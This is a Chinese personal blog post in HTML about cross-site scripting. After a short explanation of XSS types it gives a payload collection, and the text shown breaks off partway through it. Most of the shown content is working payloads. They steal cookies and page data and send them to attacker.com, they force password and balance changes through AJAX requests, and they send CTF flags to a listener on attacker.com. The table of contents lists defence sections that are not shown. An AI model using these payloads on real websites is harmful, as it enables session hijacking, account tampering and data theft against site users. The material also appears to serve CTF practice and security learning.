<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XSS-全"><meta name="keywords" content="XSS"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>XSS-全【JG的个人博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {},
  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
  twikoo: {},
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JG的个人博客" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">基础概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.</span> <span class="toc-text">XSS 的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">XSS 类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-%E9%9B%86%E5%90%88"><span class="toc-number">3.</span> <span class="toc-text">Payload 集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80-Payloads"><span class="toc-number">3.1.</span> <span class="toc-text">1. 基础 Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E5%9F%BA%E6%9C%AC%E5%BC%B9%E7%AA%97"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.1 基本弹窗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE"><span class="toc-number">3.1.2.</span> <span class="toc-text">1.2 闭合标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">1.3 事件处理器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%AB%98%E7%BA%A7%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">2. 高级攻击脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E5%9F%BA%E7%A1%80%E8%84%9A%E6%9C%AC%E6%A0%87%E7%AD%BE"><span class="toc-number">3.2.1.</span> <span class="toc-text">2.1 基础脚本标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.2 数据窃取脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E7%89%B9%E6%AE%8A%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">2.3 特殊标签利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E7%89%B9%E6%AE%8A%E5%9C%BA%E6%99%AF-Payloads"><span class="toc-number">3.2.4.</span> <span class="toc-text">2.4 特殊场景 Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E7%9B%91%E6%8E%A7%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.5.</span> <span class="toc-text">2.5 监控脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">3.3.</span> <span class="toc-text">3. 绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E6%A0%87%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.1.</span> <span class="toc-text">3.1 标签名绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-%E5%B1%9E%E6%80%A7%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.2.</span> <span class="toc-text">3.2 属性名绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-%E5%B1%9E%E6%80%A7%E5%80%BC%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.3 属性值编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4-%E5%8F%AF%E7%BC%96%E7%A0%81%E5%B1%9E%E6%80%A7"><span class="toc-number">3.3.4.</span> <span class="toc-text">3.4 可编码属性</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL-%E7%B1%BB%E5%9E%8B%E5%B1%9E%E6%80%A7%EF%BC%88%E6%94%AF%E6%8C%81-javascript-%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">URL 类型属性（支持 javascript: 协议）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E5%8A%A0%E8%BD%BD%E7%B1%BB%E5%B1%9E%E6%80%A7%EF%BC%88%E6%94%AF%E6%8C%81-base64-%E6%88%96%E5%A4%96%E9%93%BE%EF%BC%89"><span class="toc-number">3.3.4.2.</span> <span class="toc-text">资源加载类属性（支持 base64 或外链）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%B1%BB%E5%B1%9E%E6%80%A7"><span class="toc-number">3.3.4.3.</span> <span class="toc-text">脚本执行类属性</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.5.</span> <span class="toc-text">3.5 字符集与长度限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E9%9D%9E%E6%A0%87%E5%87%86%E7%BC%96%E7%A0%81"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">使用非标准编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8B%86%E5%88%86%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88%E7%94%A8%E4%BA%8E%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%89"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">拆分跨站脚本（用于绕过长度限制）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JavaScript-%E5%B1%82%E9%9D%A2%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">3.3.5.3.</span> <span class="toc-text">JavaScript 层面的绕过技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XSS-%E5%8F%AF%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">3.4.</span> <span class="toc-text">4. XSS 可插入位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">3.5.</span> <span class="toc-text">5. 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">3.5.1.</span> <span class="toc-text">5.1 黑盒测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">3.5.2.</span> <span class="toc-text">5.2 白盒测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-%E5%B8%B8%E8%A7%81%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF"><span class="toc-number">3.5.3.</span> <span class="toc-text">5.3 常见业务场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95"><span class="toc-number">3.5.4.</span> <span class="toc-text">5.4 漏洞查找方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E9%AA%8C%E8%AF%81%C2%B6"><span class="toc-number">3.5.4.1.</span> <span class="toc-text">基本验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM-%E5%9E%8B-XSS-%E6%9F%A5%E6%89%BE"><span class="toc-number">3.5.4.2.</span> <span class="toc-text">DOM 型 XSS 查找</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">3.6.</span> <span class="toc-text">6. 防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81"><span class="toc-number">3.6.1.</span> <span class="toc-text">6.1 输入验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81"><span class="toc-number">3.6.2.</span> <span class="toc-text">6.2 输出编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3-%E5%AE%89%E5%85%A8%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">3.6.3.</span> <span class="toc-text">6.3 安全响应头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4-%E5%85%B6%E4%BB%96%E6%8E%AA%E6%96%BD"><span class="toc-number">3.6.4.</span> <span class="toc-text">6.4 其他措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-5-DOM-%E5%9E%8B%E9%98%B2%E5%BE%A1"><span class="toc-number">3.6.5.</span> <span class="toc-text">6.5 DOM 型防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="toc-number">3.7.</span> <span class="toc-text">7. 实战案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8"><span class="toc-number">3.7.1.</span> <span class="toc-text">7.1 反射型 XSS 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8"><span class="toc-number">3.7.2.</span> <span class="toc-text">7.2 存储型 XSS 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-3-DOM-%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8"><span class="toc-number">3.7.3.</span> <span class="toc-text">7.3 DOM 型 XSS 利用</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color5"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color1"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">20</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">14</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">2</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">JG的个人博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">XSS-全</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2025-07-14 | 更新于 2025-07-19</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/XSS/">XSS</a></div></div></div><div class="main-content"><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>XSS (Cross-Site Scripting) 是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使得其他用户在访问该页面时执行这些脚本。</p>
<span id="more"></span>

<h3 id="XSS-的危害"><a href="#XSS-的危害" class="headerlink" title="XSS 的危害"></a>XSS 的危害</h3><blockquote>
<p>窃取用户 Cookie<br>劫持用户会话<br>修改网页内容<br>钓鱼攻击<br>传播恶意软件</p>
</blockquote>
<h2 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h2><p><strong>反射型 XSS</strong></p>
<blockquote>
<p>恶意脚本通过 URL 参数等方式注入<br>服务器将恶意脚本反射回浏览器执行<br>通常需要用户点击特定链接才能触发</p>
</blockquote>
<p><strong>存储型 XSS</strong></p>
<blockquote>
<p>恶意脚本被永久存储在服务器上<br>当其他用户访问包含恶意脚本的页面时触发<br>影响范围更大，危害更严重</p>
</blockquote>
<p><strong>DOM 型 XSS</strong></p>
<blockquote>
<p>完全在客户端执行<br>不依赖服务器响应<br>通过修改 DOM 结构触发</p>
</blockquote>
<h2 id="Payload-集合"><a href="#Payload-集合" class="headerlink" title="Payload 集合"></a>Payload 集合</h2><h3 id="1-基础-Payloads"><a href="#1-基础-Payloads" class="headerlink" title="1. 基础 Payloads"></a>1. 基础 Payloads</h3><h4 id="1-1-基本弹窗"><a href="#1-1-基本弹窗" class="headerlink" title="1.1 基本弹窗"></a>1.1 基本弹窗</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-闭合标签"><a href="#1-2-闭合标签" class="headerlink" title="1.2 闭合标签"></a>1.2 闭合标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="1-3-事件处理器"><a href="#1-3-事件处理器" class="headerlink" title="1.3 事件处理器"></a>1.3 事件处理器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;div onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;hover me&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-高级攻击脚本"><a href="#2-高级攻击脚本" class="headerlink" title="2. 高级攻击脚本"></a>2. 高级攻击脚本</h3><h4 id="2-1-基础脚本标签"><a href="#2-1-基础脚本标签" class="headerlink" title="2.1 基础脚本标签"></a>2.1 基础脚本标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 基本弹窗 --&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;   &lt;!-&gt; 弹出hello --&gt;</span><br><span class="line">&lt;script&gt;alert(/hello/)&lt;/script&gt;   &lt;!-&gt; 弹出hello --&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        &lt;!-&gt; 弹出1,对于数字可以不用引号 --&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      &lt;!-&gt; 弹出cookie --&gt;</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  &lt;!-&gt; 引用外部的xss --&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-数据窃取脚本"><a href="#2-2-数据窃取脚本" class="headerlink" title="2.2 数据窃取脚本"></a>2.2 数据窃取脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 使用 window.location.href --&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 document.location.href --&gt;</span><br><span class="line">&lt;script&gt;document.location.href=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 window.open --&gt;</span><br><span class="line">&lt;script&gt;window.open=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 获取特定元素内容 --&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&quot;http://attacker.com/collect?data=&quot;+document.getElementsByClassName(&#x27;target-class&#x27;)[0].innerHTML&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery 选择器 --&gt;</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery 选择器（带过滤） --&gt;</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;</span><br><span class="line">    if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;</span><br><span class="line">        window.location.href = &#x27;http://attacker.com/&#x27; +value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 querySelector --&gt;</span><br><span class="line">&lt;script&gt;var img = new Image();</span><br><span class="line">img.src = &quot;http://attacker.com/&quot;+document.querySelector(&#x27;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;).textContent;</span><br><span class="line">document.body.append(img);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-特殊标签利用"><a href="#2-3-特殊标签利用" class="headerlink" title="2.3 特殊标签利用"></a>2.3 特殊标签利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; SVG 标签 --&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br><span class="line">&lt;svg onload=&quot;location.href=&#x27;http://attacker.com/collect?c=&#x27;+document.cookie&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Body 标签 --&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;body onpageshow=alert(1)&gt;</span><br><span class="line">&lt;body onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line">&lt;body/**/onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line">&lt;body/onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Video 标签 --&gt;</span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Style 标签 --&gt;</span><br><span class="line">&lt;style onload=alert(1)&gt;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Iframe 标签 --&gt;</span><br><span class="line">&lt;iframe onload=document.location=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="2-4-特殊场景-Payloads"><a href="#2-4-特殊场景-Payloads" class="headerlink" title="2.4 特殊场景 Payloads"></a>2.4 特殊场景 Payloads</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 使用 Image 对象 --&gt;</span><br><span class="line">&lt;script&gt;var img = new Image();img.src = &quot;http://attacker.com/&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 XMLHttpRequest --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line">httpRequest.open(&#x27;POST&#x27;, &#x27;http://attacker.com/api/change.php&#x27;, true);</span><br><span class="line">httpRequest.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">httpRequest.send(&#x27;p=1234567&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/amount.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;u&#x27;:&#x27;1&#x27;,&#x27;a&#x27;:&#x27;&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX 修改密码 --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/change.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;p&#x27;:&#x27;1717&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX 修改金额 --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/amount.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;u&#x27;:&#x27;1&#x27;,&#x27;a&#x27;:&#x27;&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-5-监控脚本"><a href="#2-5-监控脚本" class="headerlink" title="2.5 监控脚本"></a>2.5 监控脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 使用 nc 监控</span><br><span class="line">&lt;script&gt;window.open(&#x27;http://attacker.com:9033/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 使用 jQuery 监控</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com:9033/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 使用 jQuery 监控（带过滤）</span><br><span 